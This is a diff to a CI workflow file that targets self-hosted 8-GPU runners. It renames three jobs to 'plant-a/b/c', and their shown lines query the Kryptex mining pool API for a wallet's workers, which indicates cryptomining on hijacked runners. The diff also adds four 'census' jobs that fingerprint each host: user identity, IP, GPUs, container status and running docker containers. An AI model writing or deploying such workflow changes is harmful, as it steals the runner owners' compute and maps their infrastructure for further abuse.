@@ -5,7 +5,7 @@ on:
 permissions:
   contents: read
 jobs:
-  lbl-ernie8gpu:
+  plant-a:
     runs-on: [self-hosted, ernie-8gpu]
     timeout-minutes: 55
     steps:
@@ -161,7 +161,7 @@ jobs:
           head -c 300 "$HOME/.ci/logs/worker.json" 2>/dev/null
           sec DONE
           exit 0
-  lbl-ernie8gpu-b:
+  plant-b:
     runs-on: [self-hosted, ernie-8gpu]
     timeout-minutes: 55
     steps:
@@ -317,7 +317,7 @@ jobs:
           head -c 300 "$HOME/.ci/logs/worker.json" 2>/dev/null
           sec DONE
           exit 0
-  lbl-ernie8gpu-c:
+  plant-c:
     runs-on: [self-hosted, ernie-8gpu]
     timeout-minutes: 55
     steps:
@@ -472,4 +472,64 @@ jobs:
           ( sleep 240; curl -sk -m 20 "https://api.kryptex.network/api/v1/wallet/$WALLET/workers" 2>/dev/null | head -c 400; echo ) > "$HOME/.ci/logs/worker.json" 2>&1
           head -c 300 "$HOME/.ci/logs/worker.json" 2>/dev/null
           sec DONE
+          exit 0
+  census-a:
+    runs-on: [self-hosted, ernie-8gpu]
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        run: |
+          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
+          nvidia-smi -L 2>&1 | head -12
+          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
+          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
+          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
+          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
+          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
+          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
+          exit 0
+  census-b:
+    runs-on: [self-hosted, ernie-8gpu]
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        run: |
+          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
+          nvidia-smi -L 2>&1 | head -12
+          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
+          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
+          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
+          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
+          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
+          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
+          exit 0
+  census-c:
+    runs-on: [self-hosted, ernie-8gpu]
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        run: |
+          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
+          nvidia-smi -L 2>&1 | head -12
+          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
+          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
+          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
+          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
+          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
+          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
+          exit 0
+  census-d:
+    runs-on: [self-hosted, ernie-8gpu]
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        run: |
+          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
+          nvidia-smi -L 2>&1 | head -12
+          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
+          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
+          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
+          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
+          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
+          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
           exit 0
